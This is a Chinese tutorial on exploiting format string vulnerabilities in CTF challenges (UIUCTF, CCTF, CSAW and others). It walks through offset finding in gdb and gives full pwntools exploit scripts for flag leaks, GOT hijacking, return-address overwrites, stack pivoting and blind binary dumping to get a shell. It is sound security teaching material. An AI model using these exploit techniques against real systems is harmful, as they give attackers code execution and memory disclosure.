# 格式化字符串漏洞例子

下面会介绍一些CTF中的格式化漏洞的题目。也都是格式化字符串常见的利用。

## 64位程序格式化字符串漏洞

### 原理

其实64位的偏移计算和32位类似，都是算对应的参数。只不过64位函数的前6个参数是存储在相应的寄存器中的。那么在格式化字符串漏洞中呢？虽然我们并没有向相应寄存器中放入数据，但是程序依旧会按照格式化字符串的相应格式对其进行解析。

### 例子

这里，我们以2017年的UIUCTF中pwn200 GoodLuck为例进行介绍。这里由于只有本地环境，所以我在本地设置了一个flag.txt文件。

#### 确定保护

```shell
➜  2017-UIUCTF-pwn200-GoodLuck git:(master) ✗ checksec goodluck
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

可以看出程序开启了NX保护以及部分RELRO保护。

#### 分析程序

可以发现，程序的漏洞很明显

```C
  for ( j = 0; j <= 21; ++j )
  {
    v5 = format[j];
    if ( !v5 || v11[j] != v5 )
    {
      puts("You answered:");
      printf(format);
      puts("\nBut that was totally wrong lol get rekt");
      fflush(_bss_start);
      result = 0;
      goto LABEL_11;
    }
  }
```

#### 确定偏移

我们在printf处下偏移如下,这里只关注代码部分与栈部分。

```shell
gef➤  b printf
Breakpoint 1 at 0x400640
gef➤  r
Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/2017-UIUCTF-pwn200-GoodLuck/goodluck 
what's the flag
123456
You answered:

Breakpoint 1, __printf (format=0x602830 "123456") at printf.c:28
28	printf.c: 没有那个文件或目录.

─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
   0x7ffff7a627f7 <fprintf+135>    add    rsp, 0xd8
   0x7ffff7a627fe <fprintf+142>    ret    
   0x7ffff7a627ff                  nop    
 → 0x7ffff7a62800 <printf+0>       sub    rsp, 0xd8
   0x7ffff7a62807 <printf+7>       test   al, al
   0x7ffff7a62809 <printf+9>       mov    QWORD PTR [rsp+0x28], rsi
   0x7ffff7a6280e <printf+14>      mov    QWORD PTR [rsp+0x30], rdx
───────────────────────────────────────────────────────────────────────[ stack ]────
['0x7fffffffdb08', 'l8']
8
0x00007fffffffdb08│+0x00: 0x0000000000400890  →  <main+234> mov edi, 0x4009b8	 ← $rsp
0x00007fffffffdb10│+0x08: 0x0000000031000001
0x00007fffffffdb18│+0x10: 0x0000000000602830  →  0x0000363534333231 ("123456"?)
0x00007fffffffdb20│+0x18: 0x0000000000602010  →  "You answered:\ng"
0x00007fffffffdb28│+0x20: 0x00007fffffffdb30  →  "flag{11111111111111111"
0x00007fffffffdb30│+0x28: "flag{11111111111111111"
0x00007fffffffdb38│+0x30: "11111111111111"
0x00007fffffffdb40│+0x38: 0x0000313131313131 ("111111"?)
──────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x7ffff7a62800 → Name: __printf(format=0x602830 "123456")
[#1] 0x400890 → Name: main()
─────────────────────────────────────────────────────────────────────────────────────────────────


```

可以看到flag对应的栈上的偏移为5，除去对应的第一行为返回地址外，其偏移为4。此外，由于这是一个64位程序，所以前6个参数存在在对应的寄存器中，fmt字符串存储在RDI寄存器中，所以fmt字符串对应的地址的偏移为10。而fmt字符串中%order$s对应的order为fmt字符串后面的参数的顺序，所以我们只需要输入%9\$s即可得到flag的内容。当然，我们还有更简单的方法利用https://github.com/scwuaptx/Pwngdb中的fmtarg来判断某个参数的偏移。

```shell
gef➤  fmtarg 0x00007fffffffdb28
The index of format argument : 10
```

需要注意的是我们必须break在printf处。

#### 利用程序

```python
from pwn import *
from LibcSearcher import *
goodluck = ELF('./goodluck')
if args['REMOTE']:
    sh = remote('pwn.sniperoj.cn', 30017)
else:
    sh = process('./goodluck')
payload = "%9$s"
print payload
##gdb.attach(sh)
sh.sendline(payload)
print sh.recv()
sh.interactive()
```

## hijack GOT

### 原理

在目前的C程序中，libc中的函数都是通过GOT表来跳转的。此外，在 没有开启RELRO保护的前提下，每个libc的函数对应的GOT表项是可以被修改的。因此，我们可以修改某个libc函数的GOT表内容为另一个libc函数的地址来实现对程序的控制。比如说我们可以修改printf的got表项内容为system函数的地址。从而，程序在执行printf的时候实际执行的是system函数。

假设我们将函数A的地址覆盖为函数B的地址，那么这一攻击技巧可以分为以下步骤

-   确定函数A的GOT表地址。

    -   这一步我们利用的函数A一般在程序中已有，所以可以采用简单的寻找地址的方法来找。

-   确定函数B的内存地址

    -   这一步通常来说，需要我们自己想办法来泄露对应函数B的地址。

-   将函数B的内存地址写入到函数A的GOT表地址处。

    -   这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下两种

        -   写入函数：write函数。
        -   ROP

        ```text
        pop eax; ret; 			# printf@got -> eax
        pop ebx; ret; 			# (addr_offset = system_addr - printf_addr) -> ebx
        add [eax] ebx; ret; 	# [printf@got] = [printf@got] + addr_offset
        ```

        -   格式化字符串任意地址写

### 例子

这里我们以2016 CCTF中的pwn3为例进行介绍。

#### 确定保护

如下

```shell
➜  2016-CCTF-pwn3 git:(master) ✗ checksec pwn3 
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

可以看出程序主要开启了NX保护。我们一般默认远程都是开启ASLR保护的。

#### 分析程序

首先分析程序，可以发现程序似乎主要实现了一个需密码登录的ftp，具有get，put，dir三个基本功能。大概浏览一下每个功能的代码，发现在get功能中存在格式化字符串漏洞

```C
int get_file()
{
  char dest; // [sp+1Ch] [bp-FCh]@5
  char s1; // [sp+E4h] [bp-34h]@1
  char *i; // [sp+10Ch] [bp-Ch]@3

  printf("enter the file name you want to get:");
  __isoc99_scanf("%40s", &s1);
  if ( !strncmp(&s1, "flag", 4u) )
    puts("too young, too simple");
  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )
  {
    if ( !strcmp(i, &s1) )
    {
      strcpy(&dest, i + 0x28);
      return printf(&dest);
    }
  }
  return printf(&dest);
}
```

#### 漏洞利用思路

既然有了格式化字符串漏洞，那么我们可以确定如下的利用思路

- 绕过密码
- 确定格式化字符串参数偏移
- 利用put@got获取put函数地址，进而获取对应的libc.so的版本，进而获取对应system函数地址。
- 修改puts@got的内容为system的地址。
- 当程序再次执行puts函数的时候，其实执行的是system函数。

#### 漏洞利用程序

如下

```python
from pwn import *
from LibcSearcher import LibcSearcher
##context.log_level = 'debug'
pwn3 = ELF('./pwn3')
if args['REMOTE']:
    sh = remote('111', 111)
else:
    sh = process('./pwn3')


def get(name):
    sh.sendline('get')
    sh.recvuntil('enter the file name you want to get:')
    sh.sendline(name)
    data = sh.recv()
    return data


def put(name, content):
    sh.sendline('put')
    sh.recvuntil('please enter the name of the file you want to upload:')
    sh.sendline(name)
    sh.recvuntil('then, enter the content:')
    sh.sendline(content)


def show_dir():
    sh.sendline('dir')


tmp = 'sysbdmin'
name = ""
for i in tmp:
    name += chr(ord(i) - 1)


## password
def password():
    sh.recvuntil('Name (ftp.hacker.server:Rainism):')
    sh.sendline(name)


##password
password()
## get the addr of puts
puts_got = pwn3.got['puts']
log.success('puts got : ' + hex(puts_got))
put('1111', '%8$s' + p32(puts_got))
puts_addr = u32(get('1111')[:4])

## get addr of system
libc = LibcSearcher("puts", puts_addr)
system_offset = libc.dump('system')
puts_offset = libc.dump('puts')
system_addr = puts_addr - puts_offset + system_offset
log.success('system addr : ' + hex(system_addr))

## modify puts@got, point to system_addr
payload = fmtstr_payload(7, {puts_got: system_addr})
put('/bin/sh;', payload)
sh.recvuntil('ftp>')
sh.sendline('get')
sh.recvuntil('enter the file name you want to get:')
##gdb.attach(sh)
sh.sendline('/bin/sh;')

## system('/bin/sh')
show_dir()
sh.interactive()
```

注意

- 我在获取puts函数地址时使用的偏移是8，这是因为我希望我输出的前4个字节就是puts函数的地址。其实格式化字符串的首地址的偏移是7。
- 这里我利用了pwntools中的fmtstr_payload函数，比较方便获取我们希望得到的结果，有兴趣的可以查看官方文档尝试。比如这里fmtstr_payload(7, {puts_got: system_addr})的意思就是，我的格式化字符串的偏移是7，我希望在puts_got地址处写入system_addr地址。默认情况下是按照字节来写的。

## hijack retaddr

### 原理

很容易理解，我们要利用格式化字符串漏洞来劫持程序的返回地址到我们想要执行的地址。

### 例子

这里我们以三个白帽-pwnme_k0为例进行分析。

#### 确定保护

```shell
➜  三个白帽-pwnme_k0 git:(master) ✗ checksec pwnme_k0
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

可以看出程序主要开启了NX保护以及Full RELRO保护。这我们就没有办法修改程序的got表了。

#### 分析程序

简单分析一下，就知道程序似乎主要实现了一个类似账户注册之类的功能，主要有修改查看功能，然后发现在查看功能中发现了格式化字符串漏洞

```C
int __usercall sub_400B07@<eax>(char format@<dil>, char formata, __int64 a3, char a4)
{
  write(0, "Welc0me to sangebaimao!\n", 0x1AuLL);
  printf(&formata, "Welc0me to sangebaimao!\n");
  return printf(&a4 + 4);
}
```

其输出的内容为&a4+4。我们回溯一下，发现我们读入的passwrod内容也是

```C
    v6 = read(0, (char *)&a4 + 4, 0x14uLL);
```

当然我们还可以发现我们读入的username在距离的password20个字节。

```C
  puts("Input your username(max lenth:20): ");
  fflush(stdout);
  v8 = read(0, &bufa, 0x14uLL);
  if ( v8 && v8 <= 0x14u )
  {
    puts("Input your password(max lenth:20): ");
    fflush(stdout);
    v6 = read(0, (char *)&a4 + 4, 0x14uLL);
    fflush(stdout);
    *(_QWORD *)buf = bufa;
    *(_QWORD *)(buf + 8) = a3;
    *(_QWORD *)(buf + 16) = a4;
```

好，这就差不多了。此外，也可以发现这个账号密码其实没啥配对不配对的。

#### 利用思路

我们最终的目的是希望可以获得系统的shell，可以发现在给定的文件中，在00000000004008A6地址处有一个直接调用system('bin/sh')的函数（关于这个的发现，一般都会现在程序大致看一下。）。那如果我们修改某个函数的返回地址为这个地址，那就相当于获得了shell。

虽然存储返回地址的内存本身是动态变化的，但是其相对于rbp的地址并不会改变，所以我们可以使用相对地址来计算。利用思路如下

- 确定偏移
- 获取函数的rbp与返回地址
- 根据相对偏移获取存储返回地址的地址
- 将执行system函数调用的地址写入到存储返回地址的地址。

#### 确定偏移

首先，我们先来确定一下偏移。输入用户名aaaaaaaa，密码随便输入，断点下在输出密码的那个printf(&a4 + 4)函数处

```text
Register Account first!
Input your username(max lenth:20): 
aaaaaaaa
Input your password(max lenth:20): 
%p%p%p%p%p%p%p%p%p%p
Register Success!!
1.Sh0w Account Infomation!
2.Ed1t Account Inf0mation!
3.QUit sangebaimao:(
>error options
1.Sh0w Account Infomation!
2.Ed1t Account Inf0mation!
3.QUit sangebaimao:(
>1
...
```

此时栈的情况为

```text
─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
     0x400b1a                  call   0x400758
     0x400b1f                  lea    rdi, [rbp+0x10]
     0x400b23                  mov    eax, 0x0
 →   0x400b28                  call   0x400770
   ↳    0x400770                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc0
        0x400776                  xchg   ax, ax
        0x400778                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc8
        0x40077e                  xchg   ax, ax
────────────────────────────────────────────────────────────────────[ stack ]────
0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15	 ← $rsp, $rbp
0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30
0x00007fffffffdb50│+0x10: "aaaaaaaa"	 ← $rdi
0x00007fffffffdb58│+0x18: 0x000000000000000a
0x00007fffffffdb60│+0x20: 0x7025702500000000
0x00007fffffffdb68│+0x28: "%p%p%p%p%p%p%p%pM\r@"
0x00007fffffffdb70│+0x30: "%p%p%p%pM\r@"
0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
```

可以发现我们输入的用户名在栈上第三个位置，那么除去本身格式化字符串的位置，其偏移为为5+3=8。

#### 修改地址

我们再仔细观察下断点处栈的信息

```text
0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15	 ← $rsp, $rbp
0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30
0x00007fffffffdb50│+0x10: "aaaaaaaa"	 ← $rdi
0x00007fffffffdb58│+0x18: 0x000000000000000a
0x00007fffffffdb60│+0x20: 0x7025702500000000
0x00007fffffffdb68│+0x28: "%p%p%p%p%p%p%p%pM\r@"
0x00007fffffffdb70│+0x30: "%p%p%p%pM\r@"
0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
```

可以看到栈上第二个位置存储的就是该函数的返回地址(其实也就是调用showaccounth函数时执行push rip所存储的值)，在格式化字符串中的偏移为7。

与此同时栈上，第一个元素存储的也就是上一个函数的rbp。所以我们可以得到偏移0x00007fffffffdb80-0x00007fffffffdb48=0x38。继而如果我们知道了rbp的数值，就知道了函数返回地址的地址。

0x0000000000400d74与0x00000000004008A6只有低2字节不同，所以我们可以只修改0x00007fffffffdb48开始的2个字节。

#### 利用程序

这里使用data[1:]的原因是当我们split的时候由于起始的是0x，所以会产生‘’字符串，需要跳过。

```python
from pwn import *
from LibcSearcher import *
pwnme = ELF('./pwnme_k0')
if args['REMOTE']:
    sh = remote(11, 11)
else:
    sh = process('./pwnme_k0')
sh.recvuntil(':\n')
sh.sendline('a' * 8)
sh.recvuntil(':\n')
sh.sendline('%p' * 9)
sh.recvuntil('>')
sh.sendline('1')
sh.recvuntil('a' * 8 + '\n')
data = sh.recvuntil('1.', drop=True).split('0x')
print data
data = data[1:]
rbp = int(data[5], 16)
ret_addr = rbp - 0x38
sh.recvuntil('>')
sh.sendline('2')
sh.recvuntil(':\n')
sh.sendline(p64(ret_addr))
sh.recvuntil(':\n')
payload = '%2214d%8$hn'
sh.sendline(payload)
sh.recvuntil('>')
sh.sendline('1')
sh.interactive()
```

## 堆上的格式化字符串漏洞

### 原理

所谓堆上的格式化字符串指的是格式化字符串本身存储在堆上，这个主要增加了我们获取对应偏移的难度，而一般来说，该格式化字符串都是很有可能被复制到栈上的。

### 例子

这里我们以2015年CSAW中的contacts为例进行介绍。

#### 确定保护

```shell
➜  2015-CSAW-contacts git:(master) ✗ checksec contacts
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

可以看出程序不仅开启了NX保护还开启了Canary。

#### 分析程序

简单看看程序，发现程序正如名字所描述的，是一个联系人相关的程序，可以实现创建，修改，删除，打印联系人的信息。而再仔细阅读，可以发现在输入联系人信息的时候存在格式化字符串漏洞。

```C
int __cdecl PrintInfo(int a1, int a2, int a3, char *format)
{
  printf("\tName: %s\n", a1);
  printf("\tLength %u\n", a2);
  printf("\tPhone #: %s\n", a3);
  printf("\tDescription: ");
  return printf(format);
}
```

仔细看看，可以发现这个format其实是指向堆中的。

#### 利用思路

我们的基本目的是获取系统的shell，从而拿到flag。其实既然有格式化字符串漏洞，我们应该是可以通过劫持got表或者控制程序返回地址来控制程序流程。但是这里却不怎么可行。原因分别如下

- 之所以不能够劫持got来控制程序流程，是因为我们发现对于程序中常见的可以对于我们给定的字符串输出的只有printf函数，我们只有选择它才可以构造/bin/sh让它执行system('/bin/sh')，但是printf函数在其他地方也均有用到，这样做会使得程序直接崩溃。
- 其次，不能够直接控制程序返回地址来控制程序流程的是因为我们并没有一块可以直接执行的地址来存储我们的内容，同时利用格式化字符串来往栈上直接写入system_addr+'bbbb'+addr of '/bin/sh‘似乎并不现实。


那么我们可以怎么做呢？我们还有之前在栈溢出讲的技巧，stack privot。而这里，我们可以控制的恰好是堆内存，所以我们可以把栈迁移到堆上去。这里我们通过leave指令来进行栈迁移，所以在迁移之前我们需要修改程序保存ebp的值为我们想要的值。 只有这样在执行leave指令的时候，esp才会成为我们想要的值。同时，因为我们是使用格式化字符串来进行修改，所以我们得知道保存ebp的地址为多少，而这时PrintInfo函数中存储ebp的地址每次都在变化，而我们也无法通过其他方法得知。但是，**程序中压入栈中的ebp值其实保存的是上一个函数的保存ebp值的地址**，所以我们可以修改其**上层函数的保存的ebp的值，即上上层函数（即main函数）的ebp数值**。这样当上层程序返回时，即实现了将栈迁移到堆的操作。

基本思路如下

-   首先获取system函数的地址
    -   通过泄露某个libc函数的地址根据libc database确定。
-   构造基本联系人描述为system_addr+'bbbb'+binsh_addr
-   修改上层函数保存的ebp(即上上层函数的ebp)为**存储system_addr的地址-4**。
-   当主程序返回时，会有如下操作
    -   move esp,ebp，将esp指向system_addr的地址-4
    -   pop ebp， 将esp指向system_addr
    -   ret，将eip指向system_addr，从而获取shell。

#### 获取相关地址与偏移

这里我们主要是获取system函数地址、/bin/sh地址，栈上存储联系人描述的地址，以及PrintInfo函数的地址。

首先，我们根据栈上存储的libc_start_main_ret地址(该地址是当main函数执行返回时会运行的函数)来获取system函数地址、/bin/sh地址。我们构造相应的联系人，然后选择输出联系人信息，并将断点下在printf处，并且一直运行到格式化字符串漏洞的printf函数处，如下

```shell
 → 0xf7e44670 <printf+0>       call   0xf7f1ab09 <__x86.get_pc_thunk.ax>
   ↳  0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
      0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret    
      0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
      0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret    
───────────────────────────────────────────────────────────────────────────────────────[ stack ]────
['0xffffccfc', 'l8']
8
0xffffccfc│+0x00: 0x08048c27  →   leave 	 ← $esp
0xffffcd00│+0x04: 0x0804c420  →  "1234567"
0xffffcd04│+0x08: 0x0804c410  →  "11111"
0xffffcd08│+0x0c: 0xf7e5acab  →  <puts+11> add ebx, 0x152355
0xffffcd0c│+0x10: 0x00000000
0xffffcd10│+0x14: 0xf7fad000  →  0x001b1db0
0xffffcd14│+0x18: 0xf7fad000  →  0x001b1db0
0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000	 ← $ebp
──────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0xf7e44670 → Name: __printf(format=0x804c420 "1234567\n")
[#1] 0x8048c27 → leave 
[#2] 0x8048c99 → add DWORD PTR [ebp-0xc], 0x1
[#3] 0x80487a2 → jmp 0x80487b3
[#4] 0xf7e13637 → Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0 <_dl_fini>, stack_end=0xffffce0c)
[#5] 0x80485e1 → hlt 
────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  dereference $esp 140
['$esp', '140']
1
0xffffccfc│+0x00: 0x08048c27  →   leave 	 ← $esp
gef➤  dereference $esp l140
['$esp', 'l140']
140
0xffffccfc│+0x00: 0x08048c27  →   leave 	 ← $esp
0xffffcd00│+0x04: 0x0804c420  →  "1234567"
0xffffcd04│+0x08: 0x0804c410  →  "11111"
0xffffcd08│+0x0c: 0xf7e5acab  →  <puts+11> add ebx, 0x152355
0xffffcd0c│+0x10: 0x00000000
0xffffcd10│+0x14: 0xf7fad000  →  0x001b1db0
0xffffcd14│+0x18: 0xf7fad000  →  0x001b1db0
0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000	 ← $ebp
0xffffcd1c│+0x20: 0x08048c99  →   add DWORD PTR [ebp-0xc], 0x1
0xffffcd20│+0x24: 0x0804b0a8  →  "11111"
0xffffcd24│+0x28: 0x00002b67 ("g+"?)
0xffffcd28│+0x2c: 0x0804c410  →  "11111"
0xffffcd2c│+0x30: 0x0804c420  →  "1234567"
0xffffcd30│+0x34: 0xf7fadd60  →  0xfbad2887
0xffffcd34│+0x38: 0x08048ed6  →  0x25007325 ("%s"?)
0xffffcd38│+0x3c: 0x0804b0a0  →  0x0804c420  →  "1234567"
0xffffcd3c│+0x40: 0x00000000
0xffffcd40│+0x44: 0xf7fad000  →  0x001b1db0
0xffffcd44│+0x48: 0x00000000
0xffffcd48│+0x4c: 0xffffcd78  →  0x00000000
0xffffcd4c│+0x50: 0x080487a2  →   jmp 0x80487b3
0xffffcd50│+0x54: 0x0804b0a0  →  0x0804c420  →  "1234567"
0xffffcd54│+0x58: 0xffffcd68  →  0x00000004
0xffffcd58│+0x5c: 0x00000050 ("P"?)
0xffffcd5c│+0x60: 0x00000000
0xffffcd60│+0x64: 0xf7fad3dc  →  0xf7fae1e0  →  0x00000000
0xffffcd64│+0x68: 0x08048288  →  0x00000082
0xffffcd68│+0x6c: 0x00000004
0xffffcd6c│+0x70: 0x0000000a
0xffffcd70│+0x74: 0xf7fad000  →  0x001b1db0
0xffffcd74│+0x78: 0xf7fad000  →  0x001b1db0
0xffffcd78│+0x7c: 0x00000000
0xffffcd7c│+0x80: 0xf7e13637  →  <__libc_start_main+247> add esp, 0x10
0xffffcd80│+0x84: 0x00000001
0xffffcd84│+0x88: 0xffffce14  →  0xffffd00d  →  "/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]"
0xffffcd88│+0x8c: 0xffffce1c  →  0xffffd058  →  "XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]"
```

我们可以通过简单的判断可以得到

```
0xffffcd7c│+0x80: 0xf7e13637  →  <__libc_start_main+247> add esp, 0x10
```

存储的就是main相应的地址，同时利用fmtarg来获取对应的偏移，可以看出其偏移为32，那么相对于格式化字符串的偏移为31。

```shell
gef➤  fmtarg 0xffffcd7c
The index of format argument : 32
```

这样我们便可以得到对应的地址了。进而可以根据libc-database来获取对应的libc，继而获取system函数地址与/bin/sh函数地址了。

其次，我们可以确定栈上存储格式化字符串的地址0xffffcd2c相对于格式化字符串的偏移为6，得到这个是为了构造我们的联系人。

再者，我们可以看出下面的地址保存着上层函数的调用地址，其相对于格式化字符串的偏移为11，这样我们可以直接修改上层函数存储的ebp的值。

```shell
0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000	 ← $ebp
```

#### 构造联系人获取堆地址

得知上面的信息后，我们可以利用下面的方式获取堆地址与相应的ebp地址。

```text
[system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb]
```

来获取对应的相应的地址。后面的bbbb是为了接受字符串方便。

这里因为函数调用时所申请的栈空间与释放的空间是一致的，所以我们得到的ebp地址并不会因为我们再次调用而改变。

#### 修改ebp

由于我们需要执行move指令将ebp赋给esp，并还需要执行pop ebp才会执行ret指令，所以我们需要将ebp修改为存储system地址-4的值。这样pop ebp之后，esp恰好指向保存system的地址，这时在执行ret指令即可执行system函数。

上面已经得知了我们希望修改的ebp值，而也知道了对应的偏移为11，所以我们可以构造如下的payload来进行修改相应的值。

```
part1 = (heap_addr - 4) / 2
part2 = heap_addr - 4 - part1
payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'
```

#### 获取shell

这时，执行完格式化字符串函数之后，退出到上上函数，我们输入5，退出程序即会执行ret指令，就可以获取shell。

#### 利用程序

```python
from pwn import *
from LibcSearcher import *
contact = ELF('./contacts')
##context.log_level = 'debug'
if args['REMOTE']:
    sh = remote(11, 111)
else:
    sh = process('./contacts')


def createcontact(name, phone, descrip_len, description):
    sh.recvuntil('>>> ')
    sh.sendline('1')
    sh.recvuntil('Contact info: \n')
    sh.recvuntil('Name: ')
    sh.sendline(name)
    sh.recvuntil('You have 10 numbers\n')
    sh.sendline(phone)
    sh.recvuntil('Length of description: ')
    sh.sendline(descrip_len)
    sh.recvuntil('description:\n\t\t')
    sh.sendline(description)


def printcontact():
    sh.recvuntil('>>> ')
    sh.sendline('4')
    sh.recvuntil('Contacts:')
    sh.recvuntil('Description: ')


## get system addr & binsh_addr
payload = '%31$paaaa'
createcontact('1111', '1111', '111', payload)
printcontact()
libc_start_main_ret = int(sh.recvuntil('aaaa', drop=True), 16)
log.success('get libc_start_main_ret addr: ' + hex(libc_start_main_ret))
libc = LibcSearcher('__libc_start_main_ret', libc_start_main_ret)
libc_base = libc_start_main_ret - libc.dump('__libc_start_main_ret')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
log.success('get system addr: ' + hex(system_addr))
log.success('get binsh addr: ' + hex(binsh_addr))
##gdb.attach(sh)

## get heap addr and ebp addr
payload = flat([
    system_addr,
    'bbbb',
    binsh_addr,
    '%6$p%11$pcccc',
])
createcontact('2222', '2222', '222', payload)
printcontact()
sh.recvuntil('Description: ')
data = sh.recvuntil('cccc', drop=True)
data = data.split('0x')
print data
ebp_addr = int(data[1], 16)
heap_addr = int(data[2], 16)

## modify ebp
part1 = (heap_addr - 4) / 2
part2 = heap_addr - 4 - part1
payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'
##print payload
createcontact('3333', '123456789', '300', payload)
printcontact()
sh.recvuntil('Description: ')
sh.recvuntil('Description: ')
##gdb.attach(sh)
print 'get shell'
sh.recvuntil('>>> ')
##get shell
sh.sendline('5')
sh.interactive()
```

需要注意的是，这样并不能稳定得到shell，因为我们一次性输入了太长的字符串。但是我们又没有办法在前面控制所想要输入的地址。只能这样了。

## 格式化字符串盲打

### 原理

所谓格式化字符串盲打指的是只给出可交互的ip地址与端口，不给出对应的binary文件来让我们进行pwn，其实这个和BROP差不多，不过BROP利用的是栈溢出，而这里我们利用的是格式化字符串漏洞。一般来说，我们按照如下步骤进行

- 确定程序的位数
- 确定漏洞位置 
- 利用

由于没找到比赛后给源码的题目，所以自己简单构造了两道题。

### 例子1-泄露栈

源码和部署文件均放在了对应的文件夹fmt_blind_stack中。

#### 确定程序位数

我们随便输入了%p，程序回显如下信息

```shell
➜  blind_fmt_stack git:(master) ✗ nc localhost 9999
%p
0x7ffd4799beb0
G�flag is on the stack%                          
```

告诉我们flag在栈上，同时知道了该程序是64位的，而且应该有格式化字符串漏洞。

#### 利用

那我们就一点一点测试看看

```python
from pwn import *
context.log_level = 'error'


def leak(payload):
    sh = remote('127.0.0.1', 9999)
    sh.sendline(payload)
    data = sh.recvuntil('\n', drop=True)
    if data.startswith('0x'):
        print p64(int(data, 16))
    sh.close()


i = 1
while 1:
    payload = '%{}$p'.format(i)
    leak(payload)
    i += 1

```

最后在输出中简单看了看，得到flag

```shell
////////
////////
\x00\x00\x00\x00\x00\x00\x00\xff
flag{thi
s_is_fla
g}\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\xfe\x7f\x00\x00
```

### 例子2-盲打劫持got

源码以及部署文件均已经在blind_fmt_got文件夹中。

#### 确定程序位数

通过简单地测试，我们发现这个程序是格式化字符串漏洞函数，并且程序为64位。

```shell
➜  blind_fmt_got git:(master) ✗ nc localhost 9999
%p
0x7fff3b9774c0
```

这次啥也没有回显，又试了试，发现也没啥情况，那我们就只好来泄露一波源程序了。

#### 确定偏移

在泄露程序之前，我们还是得确定一下格式化字符串的偏移，如下

```shell
➜  blind_fmt_got git:(master) ✗ nc localhost 9999
aaaaaaaa%p%p%p%p%p%p%p%p%p
aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025
```

据此，我们可以知道格式化字符串的起始地址偏移为6。

#### 泄露binary

由于程序是64位，所以我们从0x400000处开始泄露。一般来说有格式化字符串漏洞的盲打都是可以读入'\x00'字符的，，不然没法泄露怎么玩，，除此之后，输出必然是'\x00'截断的，这是因为格式化字符串漏洞利用的输出函数均是'\x00'截断的。。所以我们可以利用如下的泄露代码。

```python
##coding=utf8
from pwn import *

##context.log_level = 'debug'
ip = "127.0.0.1"
port = 9999


def leak(addr):
    # leak addr for three times
    num = 0
    while num < 3:
        try:
            print 'leak addr: ' + hex(addr)
            sh = remote(ip, port)
            payload = '%00008$s' + 'STARTEND' + p64(addr)
            # 说明有\n，出现新的一行
            if '\x0a' in payload:
                return None
            sh.sendline(payload)
            data = sh.recvuntil('STARTEND', drop=True)
            sh.close()
            return data
        except Exception:
            num += 1
            continue
    return None

def getbinary():
	addr = 0x400000
	f = open('binary', 'w')
	while addr < 0x401000:
		data = leak(addr)
		if data is None:
			f.write('\xff')
			addr += 1
		elif len(data) == 0:
			f.write('\x00')
			addr += 1
		else:
			f.write(data)
			addr += len(data)
	f.close()
getbinary()
```

需要注意的是，在payload中需要判断是否有'\n'出现，因为这样会导致源程序只读取前面的内容，而没有办法泄露内存，所以需要跳过这样的地址。

#### 分析binary

利用ida打开泄露的binary，改变程序基地址，然后简单看看，可以基本确定源程序main函数的地址

```asm
seg000:00000000004005F6                 push    rbp
seg000:00000000004005F7                 mov     rbp, rsp
seg000:00000000004005FA                 add     rsp, 0FFFFFFFFFFFFFF80h
seg000:00000000004005FE
seg000:00000000004005FE loc_4005FE:                             ; CODE XREF: seg000:0000000000400639j
seg000:00000000004005FE                 lea     rax, [rbp-80h]
seg000:0000000000400602                 mov     edx, 80h ; '€'
seg000:0000000000400607                 mov     rsi, rax
seg000:000000000040060A                 mov     edi, 0
seg000:000000000040060F                 mov     eax, 0
seg000:0000000000400614                 call    sub_4004C0
seg000:0000000000400619                 lea     rax, [rbp-80h]
seg000:000000000040061D                 mov     rdi, rax
seg000:0000000000400620                 mov     eax, 0
seg000:0000000000400625                 call    sub_4004B0
seg000:000000000040062A                 mov     rax, cs:601048h
seg000:0000000000400631                 mov     rdi, rax
seg000:0000000000400634                 call    near ptr unk_4004E0
seg000:0000000000400639                 jmp     short loc_4005FE
```

